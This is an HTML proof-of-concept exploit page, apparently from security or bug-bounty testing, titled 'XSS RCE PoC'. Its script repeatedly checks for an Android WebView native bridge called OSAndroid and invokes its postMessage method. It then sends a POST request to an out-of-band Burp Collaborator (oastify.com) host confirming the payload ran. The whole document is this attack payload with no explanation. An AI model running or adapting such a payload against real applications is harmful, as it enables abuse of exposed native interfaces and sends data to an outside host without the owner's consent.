<!DOCTYPE html>
<html>
  <head>
    <title>XSS RCE PoC</title>
    <script>
      let attempts = 0;
      const maxAttempts = 30;

      const interval = setInterval(() => {
        attempts++;
        if (window.OSAndroid && typeof OSAndroid.postMessage === 'function') {
          clearInterval(interval);
          // Call native postMessage
          OSAndroid.postMessage(JSON.stringify({ type: "rendering_complete" }));

          // Send data to collaborator
          fetch("https://0fgo4lgo69nq5yo8he9arf5uqlwck78w.oastify.com", {
            method: "POST",
            body: JSON.stringify({ leak: "PoC reached" }),
          });
        } else if (attempts > maxAttempts) {
          clearInterval(interval);
          alert("OSAndroid interface not available.");
        }
      }, 500);
    </script>
  </head>
  <body>
    <h1>Loading payload...</h1>
  </body>
</html>
